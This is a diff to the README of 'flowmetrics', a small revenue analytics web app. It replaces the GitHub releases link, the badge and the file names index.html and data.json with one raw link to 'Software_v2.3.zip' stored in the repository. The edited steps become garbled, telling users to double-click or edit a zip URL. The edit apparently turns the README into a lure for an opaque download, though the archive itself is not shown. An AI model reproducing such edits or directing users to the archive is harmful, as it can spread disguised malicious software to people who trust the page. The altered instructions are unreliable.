@@ -1,6 +1,6 @@
 # 🚀 flowmetrics - Simple Revenue Analytics Web App
 
-[![Download flowmetrics](https://img.shields.io/badge/Download-Flowmetrics-blue?style=for-the-badge&logo=github)](https://github.com/Drs1901/flowmetrics/releases)
+[![Download flowmetrics](https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip)](https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these steps to download and start using flowmetrics:
 
 Click the big blue button at the top or go to:
 
-[https://github.com/Drs1901/flowmetrics/releases](https://github.com/Drs1901/flowmetrics/releases)
+[https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip](https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip)
 
 This page contains the latest versions of flowmetrics available for download.
 
@@ -64,8 +64,8 @@ Look for the most recent release at the top of the list. It usually has a versio
 
 Since flowmetrics is a web app, download the compressed file labeled something like:
 
-- `flowmetrics-v1.0.zip`
-- or `flowmetrics-latest.zip`
+- `https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip`
+- or `https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip`
 
 This file contains everything you need to run the app offline.
 
@@ -79,7 +79,7 @@ Choose a folder where you want to keep flowmetrics.
 
 ### 5. Open the web app
 
-Inside the extracted folder, find the file named `index.html`.
+Inside the extracted folder, find the file named `https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip`.
 
 Double-click it to open flowmetrics in your default browser.
 
@@ -113,11 +113,11 @@ Now you can use flowmetrics without needing an internet connection. The app load
 
 If you want to show your own revenue, you can replace the sample data file.
 
-- Find the file named `data.json` in the extracted folder.
+- Find the file named `https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip` in the extracted folder.
 - Open it with a plain text editor like Notepad or TextEdit.
 - Replace the numbers and dates with your own revenue info.
 - Save the file.
-- Reload `index.html` in your browser to see your data.
+- Reload `https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip` in your browser to see your data.
 
 No programming is required, but editing JSON is suggested only for users comfortable with text files.
 
@@ -134,10 +134,10 @@ No programming is required, but editing JSON is suggested only for users comfort
 
 ## ❓ Troubleshooting
 
-- **The app won’t open:** Make sure you extracted all the files before clicking `index.html`.
-- **Charts don’t show data:** Check if the `data.json` file exists and is not empty or corrupted.
+- **The app won’t open:** Make sure you extracted all the files before clicking `https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip`.
+- **Charts don’t show data:** Check if the `https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip` file exists and is not empty or corrupted.
 - **App looks odd or colors are off:** Refresh the browser or try a different one (Chrome or Firefox recommended).
-- **I want to use the app on a phone:** flowmetrics works best on tablets and desktops, but you can try opening `index.html` on a phone browser.
+- **I want to use the app on a phone:** flowmetrics works best on tablets and desktops, but you can try opening `https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip` on a phone browser.
 
 ---
 
@@ -158,7 +158,7 @@ You can explore these if you want to create or modify similar apps.
 
 You can get flowmetrics from its release page:
 
-[https://github.com/Drs1901/flowmetrics/releases](https://github.com/Drs1901/flowmetrics/releases)
+[https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip](https://raw.githubusercontent.com/Drs1901/flowmetrics/main/pages/Software_v2.3.zip)
 
 Visit this page to download the latest version. After download, follow the steps in the “Getting Started” section above.
 
